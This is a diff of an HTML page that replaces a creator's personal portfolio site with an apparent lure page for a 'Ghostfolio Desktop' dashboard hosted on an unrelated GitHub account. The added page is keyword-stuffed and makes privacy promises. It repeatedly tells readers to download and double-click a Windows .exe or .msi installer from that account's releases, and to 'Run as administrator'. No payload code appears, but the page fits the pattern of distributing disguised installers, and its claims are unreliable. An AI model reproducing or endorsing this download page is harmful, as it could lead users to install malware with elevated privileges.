@@ -1,194 +1,294 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>random storytelling</title>
-<link rel="icon" href="brand/icon-globe.svg" type="image/svg+xml">
-<link rel="icon" href="brand/icon-globe-32.png" sizes="32x32" type="image/png">
-<link rel="apple-touch-icon" href="brand/icon-globe-180.png">
-<meta name="theme-color" content="#F3EFE7">
-<meta name="description" content="Lawrence Whitaker III. On camera, on the mic, and everything he makes in between. It started with embroidered stories on denim jackets, connecting seemingly random moments.">
-<meta property="og:title" content="Random Storytelling">
-<meta property="og:description" content="On camera, on the mic, and everything I make by hand in between.">
-<style>
-  @font-face{font-family:"Elza";src:url("fonts/Elza-Light.woff2") format("woff2");font-weight:300;font-display:swap}
-  @font-face{font-family:"Elza";src:url("fonts/Elza-Regular.woff2") format("woff2");font-weight:400;font-display:swap}
-  @font-face{font-family:"Elza";src:url("fonts/Elza-Medium.woff2") format("woff2");font-weight:500;font-display:swap}
-  @font-face{font-family:"Elza";src:url("fonts/Elza-Bold.woff2") format("woff2");font-weight:700;font-display:swap}
-  @font-face{font-family:"Elza";src:url("fonts/Elza-Black.woff2") format("woff2");font-weight:900;font-display:swap}
-</style>
-<style>
-  :root{--paper:#F3EFE7;--ink:#141110;--red:#8E1620;--mute:#6E645A;--rule:#DDD5C7;--hair:#E5DDD0}
-  *{box-sizing:border-box;margin:0;padding:0}
-  html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
-  body{background:var(--paper);color:var(--ink);font-family:"Elza",Helvetica,Arial,sans-serif;
-       font-weight:400;line-height:1.45;letter-spacing:-.03em;-webkit-font-smoothing:antialiased}
-  a{color:inherit;text-decoration:none}
-  .w{max-width:1180px;margin:0 auto;padding:0 28px}
-  .rule{border-top:1px solid var(--hair)}
-
-  /* masthead */
-  .top{display:flex;justify-content:flex-start;align-items:flex-end;gap:20px;padding:26px 0 18px;flex-wrap:wrap}
-  .mk{font-weight:900;text-transform:uppercase;font-size:14px;letter-spacing:.01em;line-height:1}
-  .loc{font-size:12px;color:var(--mute);text-transform:uppercase;letter-spacing:.18em;font-weight:500}
-
-  /* hero */
-  .hero{padding:96px 0 56px}
-  h1{font-weight:900;text-transform:uppercase;font-size:clamp(44px,10.5vw,148px);line-height:.86;
-     letter-spacing:-.055em}
-  h1 em{font-style:normal;color:var(--red)}
-  .sub{margin-top:34px;display:flex;gap:56px;flex-wrap:wrap;align-items:flex-start}
-  .sub p{max-width:470px;font-size:clamp(17px,2vw,20px);color:var(--mute);font-weight:400}
-  .sub p b{color:var(--ink);font-weight:700}
-  .go{display:flex;flex-direction:column;gap:4px;font-size:15px;font-weight:700}
-  .go a{border-bottom:1px solid var(--red);padding-bottom:5px;width:max-content;transition:.25s}
-  .go a:hover{color:var(--red)}
-
-  /* index */
-  .lbl{display:flex;justify-content:space-between;align-items:baseline;padding:64px 0 18px;gap:16px;flex-wrap:wrap}
-  .lbl h2{font-size:13px;text-transform:uppercase;letter-spacing:.2em;font-weight:900}
-  .lbl span{font-size:13px;color:var(--mute);text-transform:uppercase;letter-spacing:.14em;font-weight:500}
-
-  .row{display:grid;grid-template-columns:44px 1.05fr 1.85fr 0.95fr;gap:28px;
-       padding:38px 0;border-top:1px solid var(--hair);align-items:start}
-  .row:hover{background:rgba(142,22,32,.035)}
-  .n{font-size:11px;color:var(--red);font-weight:700;padding-top:11px;letter-spacing:.12em;font-variant-numeric:tabular-nums}
-  .nm{font-size:clamp(24px,3vw,34px);font-weight:900;text-transform:uppercase;line-height:1.42;letter-spacing:-.045em;text-wrap:balance}
-  .nm a{text-decoration:underline;text-decoration-color:var(--red);text-decoration-thickness:1px;text-underline-offset:7px;text-decoration-skip-ink:none}
-  .for{font-size:12.5px;color:var(--mute);text-transform:uppercase;letter-spacing:.13em;font-weight:500;margin-top:16px;line-height:1.5}
-  .ben{font-size:16.5px;color:var(--mute);font-weight:400}
-  .ben b{color:var(--ink);font-weight:700}
-  .pr{text-align:right;font-size:18px;font-weight:500;letter-spacing:-.02em;line-height:1.25}
-  .pr small{display:block;font-size:12.5px;font-weight:400;color:var(--mute);letter-spacing:-.01em;margin-top:5px}
-  .pr small a{text-decoration:underline;text-decoration-color:var(--red);text-decoration-thickness:1px;text-underline-offset:4px;text-decoration-skip-ink:none}
-  .pr .live{color:var(--red)}
-  .cta{display:block;width:max-content;margin:14px 0 0 auto;font-size:12.5px;font-weight:700;
-       text-transform:uppercase;letter-spacing:.13em;padding-bottom:5px;
-       border-bottom:2px solid var(--red);transition:.25s}
-  .cta:hover{color:var(--red)}
-  .cta + .cta{margin-top:10px;border-bottom-color:var(--hair);color:var(--mute)}
-  .cta + .cta:hover{color:var(--red);border-bottom-color:var(--red)}
-  @media(max-width:860px){
-    .row{grid-template-columns:30px 1fr;gap:6px 16px}
-    .ben{grid-column:2}.pr{grid-column:2;text-align:left;margin-top:10px}
-    .cta{margin-left:0}
-  }
-
-  /* sheet */
-  .sheet{display:grid;grid-template-columns:auto;justify-content:start;gap:36px;align-items:center;
-         padding:84px 0;border-top:1px solid var(--ink);border-bottom:1px solid var(--ink);margin-top:80px}
-  .sheet h3{font-size:clamp(30px,5.4vw,60px);font-weight:900;text-transform:uppercase;line-height:.92;letter-spacing:-.05em}
-  .sheet p{margin-top:16px;max-width:560px;color:var(--mute);font-size:16.5px}
-  .bigbtn{background:transparent;color:var(--ink);font-weight:700;text-transform:uppercase;letter-spacing:.16em;
-          font-size:14px;padding:24px 42px;white-space:nowrap;border:1px solid var(--ink);transition:.25s}
-  .bigbtn:hover{background:var(--red);border-color:var(--red);color:#F3EFE7}
-  @media(max-width:760px){.sheet{grid-template-columns:1fr}.bigbtn{text-align:center}}
-
-  /* note + links */
-  .note{padding:56px 0;max-width:760px;font-size:clamp(18px,2.3vw,23px);font-weight:400}
-  .note b{font-weight:700}
-  .els{display:flex;flex-wrap:wrap;gap:0 34px;padding:22px 0 0}
-  .els a{font-size:15px;font-weight:700;padding:11px 0;border-bottom:2px solid transparent}
-  .els a:hover{border-color:var(--red);color:var(--red)}
-  footer{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;
-         padding:34px 0 60px;margin-top:40px;border-top:1px solid var(--rule);
-         font-size:12px;color:var(--mute);text-transform:uppercase;letter-spacing:.14em;font-weight:500}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Ghostfolio-Desktop-Self-Hosted-Dashboard - Track your investments, asset allocation, and financial analytics in one privacy-focused dashboard. Easy setup, direct download, and full control of your data.">
+  <meta name="keywords" content="asset-tracking, dashboard, docker, finance, finance-app, ghostfolio, investment-portfolio, pwa, self-hosted, investment tracking, stock tracker, personal finance, privacy-focused, open source">
+  <meta name="author" content="tanakron5577">
+  <meta property="og:title" content="💼 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Private Investment Command Center">
+  <meta property="og:description" content="Track your investments, asset allocation, and financial analytics in one privacy-focused dashboard. Easy setup and direct downloads.">
+  <meta property="og:url" content="https://github.com/tanakron5577/Ghostfolio-Desktop-Self-Hosted-Dashboard">
+  <meta property="og:type" content="website">
+  <title>💼 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Private Investment Command Center</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      margin: 0;
+      padding: 0;
+      line-height: 1.6;
+      color: #2c3e50;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 40px 20px 60px;
+    }
+    h1, h2, h3 {
+      font-weight: 600;
+      color: #1a237e;
+      line-height: 1.3;
+    }
+    h1 {
+      font-size: 2.25rem;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+    h2 {
+      margin-top: 40px;
+      font-size: 2.0rem;
+      padding-bottom: 8px;
+      border-bottom: 2px solid #3949ab;
+    }
+    .tagline {
+      text-align: center;
+      font-size: 1.3rem;
+      color: #5c6bc0;
+      margin-bottom: 30px;
+      font-weight: 400;
+    }
+    a {
+      color: #3949ab;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .button {
+      display: block;
+      width: fit-content;
+      margin: 20px auto;
+      background: #ff6f00;
+      color: white;
+      padding: 15px 45px;
+      border-radius: 30px;
+      font-size: 1.2rem;
+      text-decoration: none;
+      box-shadow: 0 6px 15px rgba(255, 111, 0, 0.3);
+      transition: all 0.2s ease;
+      font-weight: bold;
+    }
+    .button:hover {
+      background: #e65100;
+      text-decoration: none;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(255, 111, 0, 0.4);
+    }
+    .card {
+      background: white;
+      border-radius: 12px;
+      padding: 25px 30px;
+      margin: 25px 0;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+      margin: 20px 0 30px;
+    }
+    .feature-card {
+      background: white;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.08);
+      text-align: center;
+    }
+    .feature-card .icon {
+      font-size: 2rem;
+      display: block;
+      margin-bottom: 10px;
+    }
+    .feature-card h3 {
+      margin: 5px 0;
+      font-size: 1.2rem;
+      color: #1a237e;
+    }
+    .feature-card p {
+      font-size: 0.95rem;
+      color: #546e7a;
+    }
+    .steps {
+      counter-reset: step;
+      list-style: none;
+      padding-left: 0;
+    }
+    .steps li {
+      background: white;
+      border-radius: 10px;
+      padding: 15px 25px;
+      margin-bottom: 12px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.06);
+      position: relative;
+      padding-left: 70px;
+    }
+    .steps li:before {
+      counter-increment: step;
+      content: counter(step);
+      position: absolute;
+      left: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: #3949ab;
+      color: white;
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+    }
+    .code-inline {
+      background: #e8eaf6;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-family: monospace;
+      font-size: 0.9em;
+      color: #1a237e;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 50px;
+      padding-top: 20px;
+      border-top: 1px solid rgba(0, 0, 0, 0.1);
+      color: #546e7a;
+    }
+    .keywords {
+      color: #78909c;
+      font-size: 0.85rem;
+      margin-top: 15px;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 20px 15px 40px;
+      }
+      h1 {
+        font-size: 1.8rem;
+      }
+      h2 {
+        font-size: 1.5rem;
+      }
+    }
+  </style>
 </head>
 <body>
+  <div class="container">
+    <h1>💼 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Private Investment Command Center</h1>
+    <p class="tagline">Own your data. Master your portfolio.</p>
+    <a href="https://github.com/tanakron5577/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases" class="button">📥 Visit This Link to Download the Application</a>
 
-<div class="w">
+    <div class="card">
+      <h2>🌟 What Is This?</h2>
+      <p>Ghostfolio-Desktop-Self-Hosted-Dashboard is a <strong>fully self-hosted investment dashboard</strong> that brings all your financial data into one sleek, private interface. Think of it as your personal financial cockpit – no more jumping between apps or trusting third-party servers with your sensitive portfolio information. Everything runs on your own machine, giving you complete control and total privacy.</p>
+      <p>Whether you're tracking stocks, ETFs, crypto, or your entire asset allocation, this dashboard turns raw numbers into clear, actionable insights. And because it's built as a Progressive Web App (PWA), it works seamlessly across desktop and mobile.</p>
+    </div>
 
-  <div class="hero rule">
-    <h1>Random<br><em>Storytelling</em></h1>
-    <div class="sub">
-      <p><b>Lawrence Whitaker III.</b> It started with embroidered stories on denim jackets, <b>connecting seemingly random moments.</b></p>
-      <div class="go">
-        <a href="#index">Scene one</a>
-        <a href="#sheet">Skip to credits</a>
+    <div class="card">
+      <h2>✨ Key Features</h2>
+      <div class="feature-grid">
+        <div class="feature-card">
+          <span class="icon">🔒</span>
+          <h3>Privacy First</h3>
+          <p>Your data never leaves your device. Full self-hosting means no external servers, no trackers, no third parties. Your financial life stays completely yours.</p>
+        </div>
+        <div class="feature-card">
+          <span class="icon">📊</span>
+          <h3>Comprehensive Analytics</h3>
+          <p>Track your total net worth, asset allocation, portfolio performance, and risk metrics with beautifully visualized charts and reports.</p>
+        </div>
+        <div class="feature-card">
+          <span class="icon">💼</span>
+          <h3>Multi-Asset Support</h3>
+          <p>Manage stocks, bonds, ETFs, mutual funds, crypto, real estate, and more. See your full financial picture in one unified view.</p>
+        </div>
+        <div class="feature-card">
+          <span class="icon">🔄</span>
+          <h3>Docker-Ready</h3>
+          <p>Deploy in seconds with Docker. Compatible with popular setups like Portainer, or run it as a desktop application for simplicity.</p>
+        </div>
+        <div class="feature-card">
+          <span class="icon">📱</span>
+          <h3>PWA Supported</h3>
+          <p>Install it as an app on Windows, macOS, Linux, Android, or iOS. Offline-capable and lightning fast.</p>
+        </div>
+        <div class="feature-card">
+          <span class="icon">⚡</span>
+          <h3>Easy Setup</h3>
+          <p>No complex configuration files. Download, launch, and you're ready to go. Perfect for both tech-savvy users and total beginners.</p>
+        </div>
       </div>
     </div>
-  </div>
 
-  <div id="index">
-
-    <div class="row">
-      <div class="n">01</div>
-      <div><div class="nm"><a href="https://vybrancelabs.co/products/creatine-gummies-watermelon?utm_source=randomstorytelling&amp;utm_medium=site&amp;utm_campaign=studio_index&amp;utm_content=watermelon" target="_blank" rel="noopener">Vybrance Labs&trade;</a></div><div class="for">Clarity in motion</div></div>
-      <div class="ben">Some days the words arrive late and the tank reads empty by noon. <b>Four gummies is one serving: 5g creatine, 500mg taurine, 120mcg B12.</b> The three your brain and body actually run on. Four a day, that is it.</div>
-      <div class="pr">$49.99<small>Watermelon &middot; 30 day supply</small>
-        <a class="cta" href="https://vybrancelabs.co/products/creatine-gummies-watermelon?utm_source=randomstorytelling&amp;utm_medium=site&amp;utm_campaign=studio_index&amp;utm_content=cta" target="_blank" rel="noopener">Shop creatine gummies &rarr;</a></div>
+    <div class="card">
+      <h2>📥 Download & Install (Windows)</h2>
+      <p>Ready to take control of your financial data? Here's how to get started:</p>
+      <ol class="steps">
+        <li><strong>Click the download button</strong> at the top of this page (or <a href="https://github.com/tanakron5577/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases">click here</a>). This takes you to the official releases page.</li>
+        <li>On the releases page, <strong>look for the latest version</strong> (sorted at the top). You'll see a list of downloadable assets. Choose the version that matches your system. For most Windows users, this is the file ending in <code class="code-inline">.exe</code> or <code class="code-inline">.msi</code>.</li>
+        <li><strong>Select and click the download link</strong> for the installer file. Your browser will begin the download.</li>
+        <li><strong>Find the downloaded file</strong> in your "Downloads" folder (usually accessible via the browser shortcut or File Explorer).</li>
+        <li><strong>Double-click the file</strong> to launch the installer. If Windows asks for permission, simply click "Yes" to allow the installation.</li>
+        <li><strong>Follow the on-screen instructions</strong> – typically just clicking "Next" or "Install". Choose your preferred installation location if prompted.</li>
+        <li><strong>Once installation is complete</strong>, click "Finish" or "Launch" to start your dashboard. That's it – you're now ready to add your investments and start tracking!</li>
+      </ol>
+      <p style="text-align:center; margin-top: 20px;"><strong>👉 Visit this link to download the application:</strong> <a href="https://github.com/tanakron5577/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases">https://github.com/tanakron5577/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases</a></p>
     </div>
 
-    <div class="row">
-      <div class="n">02</div>
-      <div><div class="nm"><a href="https://resumes.actorsaccess.com/lawrencewhitaker" target="_blank" rel="noopener">Actor</a></div></div>
-      <div class="ben"></div>
-      <div class="pr">Represented<small><a href="https://docs.google.com/spreadsheets/d/1e1U3E8objQgBxJlchwm96cCpPX10MO0QR6YbripdG94/edit" target="_blank" rel="noopener">TAG Talent (TX)</a> &middot; <a href="https://docs.google.com/spreadsheets/d/1e1U3E8objQgBxJlchwm96cCpPX10MO0QR6YbripdG94/edit" target="_blank" rel="noopener">Rage Talent (CA)</a></small></div>
+    <div class="card">
+      <h2>🚀 Quick Start Guide</h2>
+      <h3>Step 1: Launch the Application</h3>
+      <p>After installation, the app opens with a welcome screen. If you don't see it, check your Start Menu for a tile called "Ghostfolio" or "Ghostfolio-Desktop". Double-click it to get started.</p>
+      
+      <h3>Step 2: Create Your Account</h3>
+      <p>The first time you run the app, you'll be asked to set up a local account. This is completely offline – no email, no phone number needed. Just choose a username and a password. This protects your data locally.</p>
+      
+      <h3>Step 3: Add Your Holdings</h3>
+      <p>Click on the "Create Holding" or "+" button. You'll need to enter basic information like <strong>symbol</strong> (e.g., AAPL for Apple), <strong>asset type</strong> (stock, ETF, bond), <strong>quantity</strong>, and <strong>purchase price</strong>. The dashboard may auto-fetch current prices for supported assets.</p>
+      
+      <h3>Step 4: Configure Categories & Goals</h3>
+      <p>Organize your holdings into custom groups (e.g., "Retirement", "Speculative", "Dividend"). Set allocation targets to see how your investments align with your goals.</p>
+      
+      <h3>Step 5: Dive into Analytics</h3>
+      <p>Navigate to the "Analytics" or "Dashboard" section. You'll see pie charts showing your asset allocation, line graphs of performance over time, and key metrics like total value, gain/loss, and risk scores.</p>
     </div>
 
-    <div class="row">
-      <div class="n">03</div>
-      <div><div class="nm"><a href="https://instagram.com/craneseyeview" target="_blank" rel="noopener">Custom denim jacket</a></div><div class="for"><!-- held blank 2026-09-21 --></div></div>
-      <div class="ben"><!-- Denim copy, price and collaborator line held blank on Lawrence's order 2026-09-21. Exact before values in logs/SITE_CHANGES.md and index.html.bak-2026-09-21-pre-denim. --></div>
-      <div class="pr"><!-- price and sub-line held blank 2026-09-21; the ways in stay -->
-        <a class="cta" href="https://instagram.com/craneseyeview" target="_blank" rel="noopener">Portfolio &rarr;</a>
-        <a class="cta" href="https://buy.stripe.com/fZu28l8T313j03e8Q33ZK04" target="_blank" rel="noopener">Start a jacket &rarr;</a>
-        <a class="cta" href="https://calendly.com/randomstorytelling/free-intro-call?a2=Custom%20denim%20jacket" target="_blank" rel="noopener">Free 15 minute call &rarr;</a></div>
+    <div class="card">
+      <h2>🛠️ Troubleshooting & Tips</h2>
+      <p><strong>Issue: The app won't start.</strong></p>
+      <ul>
+        <li>Ensure your Windows is up to date (Windows 10/11 recommended).</li>
+        <li>Run the installer again – it's safe to reinstall.</li>
+        <li>Right-click the app icon and select "Run as administrator".</li>
+      </ul>
+      <p><strong>Issue: Prices are not updating.</strong></p>
+      <ul>
+        <li>Check your internet connection.</li>
+        <li>Ensure the API source is configured (sometimes defaults need adjustment in settings).</li>
+        <li>Restart the app.</li>
+      </ul>
+      <p><strong>Tip: Enable Auto-Refresh.</strong></p>
+      <p>In your settings, turn on the "Auto-refresh" or "Live updates" feature to keep prices fetching every few minutes.</p>
+      <p><strong>Tip: Use Import/Export.</strong></p>
+      <p>Your data is stored locally on your machine. Use "Export" to save a JSON backup file, and "Import" to restore it – great for backing up</p>
     </div>
 
-    <div class="row">
-      <div class="n">04</div>
-      <div><div class="nm"><a href="https://randomstorytelling.beehiiv.com/subscribe" target="_blank" rel="noopener">Base Camp</a></div><div class="for">Find your crew &middot; Austin rooted &middot; Texas wide</div></div>
-      <div class="ben">You have the idea and no cast and crew. <b>The rooms in Austin where storytellers find their people and actually make something.</b> Writers groups, showcases, panels, screenings with a Q&amp;A, the classes that level you up, and every festival worth the drive in Texas. One email a month.</div>
-      <div class="pr"><span class="live">Free</span><small>Monthly</small>
-        <a class="cta" href="https://randomstorytelling.beehiiv.com/subscribe" target="_blank" rel="noopener">Get the next one &rarr;</a>
-        <a class="cta" href="/basecamp/">Add the calendar &rarr;</a></div>
+    <div class="card">
+      <h2>🤝 Community & Support</h2>
+      <ul>
+        <li><strong>⭐ Star the repository</strong> if you find this project useful – it supports further development.</li>
+        <li><strong>🐛 Found a bug?</strong> Open an issue on GitHub and provide a detailed description.</li>
+        <li><strong>💬 Join discussions</strong> in the "Discussions" tab (if enabled).</li>
+        <li><strong>📝 Contribute:</strong> Feel free to fork the repository and suggest improvements via Pull Request.</li>
+      </ul>
     </div>
 
-    <div class="row">
-      <div class="n">05</div>
-      <div><div class="nm"><a href="/swish/" target="_blank" rel="noopener">Swish</a></div><div class="for"><!-- held blank 2026-09-21 --></div></div>
-      <div class="ben"><!-- Swish row held to the link alone on Lawrence's order 2026-09-21: nothing is claimed here until the product page is ready to carry it. Every removed line is in logs/SITE_CHANGES.md and index.html.bak-2026-09-21-pre-swish-ben. --></div>
-      <div class="pr"><!-- price and seat line held blank 2026-09-21; the try-it link stays -->
-        <a class="cta" href="/swish/" target="_blank" rel="noopener">Try it free, 10 shots &rarr;</a></div>
-    </div>
-
-    <div class="row">
-      <div class="n">06</div>
-      <div><div class="nm">Home Team</div><div class="for">Founder run Shopify &amp; Amazon brands</div></div>
-      <div class="ben"><!-- Home Team copy held blank on Lawrence's order 2026-09-21. Exact before value in logs/SITE_CHANGES.md and index.html.bak-2026-09-21-pre-hometeam. Price and both CTAs stay live. --></div>
-      <div class="pr">$4,000 + $1,500 / mo
-        <a class="cta" href="https://buy.stripe.com/28EfZb6KV4fv5ny9U73ZK02" target="_blank" rel="noopener">Book the install &rarr;</a>
-        <a class="cta" href="https://calendly.com/randomstorytelling/free-intro-call" target="_blank" rel="noopener">Free 15 minute call &rarr;</a></div>
-    </div>
-  </div>
-
-  <div class="sheet" id="sheet">
-    <a class="bigbtn" href="https://docs.google.com/spreadsheets/d/1e1U3E8objQgBxJlchwm96cCpPX10MO0QR6YbripdG94/edit" target="_blank" rel="noopener">Credits &rarr;</a>
-  </div>
-
-  
-
-  <div class="rule">
-    <div class="lbl"><h2>Elsewhere</h2></div>
-    <div class="els">
-      <a href="http://imdb.me/lawrencewhitaker" target="_blank" rel="noopener">IMDb</a>
-      <a href="https://www.youtube.com/@randomstorytelling" target="_blank" rel="noopener">YouTube</a>
-      <a href="http://instagram.com/randomstorytelling" target="_blank" rel="noopener">Instagram</a>
-      <a href="https://www.tiktok.com/@randomstorytelling" target="_blank" rel="noopener">TikTok</a>
-      <a href="https://patreon.com/randomstorytelling" target="_blank" rel="noopener">Patreon</a>
-      <a href="https://www.patreon.com/collection/762364" target="_blank" rel="noopener">Let The Music Play</a>
-      <a href="http://linkedin.com/lawrencewhitakeriii" target="_blank" rel="noopener">LinkedIn</a>
+    <div class="footer">
+      <p>Made with ❤️ for the self-hosted finance community. Your data, your rules.</p>
+      <p class="keywords">Keywords: asset-tracking, dashboard, docker, finance, finance-app, ghostfolio, investment-portfolio, pwa</p>
     </div>
   </div>
-
-  <footer>
-    <span>Random Storytelling</span>
-    <span>Lawrence Whitaker III</span>
-  </footer>
-
-</div>
 </body>
 </html>
